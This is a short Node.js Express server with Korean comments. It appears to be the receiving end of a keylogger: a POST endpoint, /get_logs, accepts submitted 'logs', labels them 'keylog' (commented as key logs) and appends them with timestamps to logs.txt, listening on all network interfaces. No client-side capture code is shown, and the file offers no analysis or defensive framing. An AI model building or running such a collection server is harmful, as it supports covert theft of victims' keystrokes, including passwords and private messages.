const express = require('express');
const fs = require('fs');
const app = express();

const escapeSpecialChars = (jsonString) => {
    // 특수 문자를 이스케이프 처리
    return jsonString.replace(/[\u0000-\u001F\u007F-\uFFFF]/g, function(match) {
        return '\\u' + ('0000' + match.charCodeAt(0).toString(16)).slice(-4);
    });
}

// JSON 형식의 요청 본문을 해석하는 미들웨어
app.use(express.json());


app.post('/get_logs', (req, res) => {
    let logs = req.body.logs; // 데이터 불러오기
    logs = escapeSpecialChars(logs); //이스케이프 함수로 이동
    console.log(logs)
    console.log(req.body);
    const logEntry = {
        timestamp: new Date().toISOString(), //날짜
        keylog: logs // 키 로그
    };

    const logEntryJSON = JSON.stringify(logEntry)+"\n"; // json형식으로 변환 및 줄 바꿈

    fs.appendFile('logs.txt', logEntryJSON, (err) => { //logs.txt에 logEntryJSON 저장
        if (err) {
            console.error('Error writing to log file', err);
            res.status(500).send({ result: false }); // 저장 실패시 false 반환
        } else {
            console.log("success");
            res.send({ result: true }); //저장 성공시 ture 반환
        }
    });
});

const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => { // 모든 서버 오픈 if ip===127.0.0.1 로컬 호스트만 오픈
    console.log(`Server is running on http://localhost:${PORT}`);
});